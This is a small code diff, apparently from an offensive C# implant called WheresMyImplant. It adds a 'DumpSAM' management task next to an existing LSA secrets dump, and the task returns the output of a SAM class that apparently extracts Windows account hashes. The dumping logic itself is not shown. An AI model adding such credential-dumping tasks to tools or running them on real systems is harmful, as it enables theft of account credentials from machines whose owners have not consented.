@@ -412,5 +412,12 @@ namespace WheresMyImplant
             }
             return lsaSecrets.GetOutput();
         }
+
+        [ManagementTask]
+        public static String DumpSAM()
+        {
+            SAM sam = new SAM();
+            return sam.GetOutput();
+        }
     }
 }
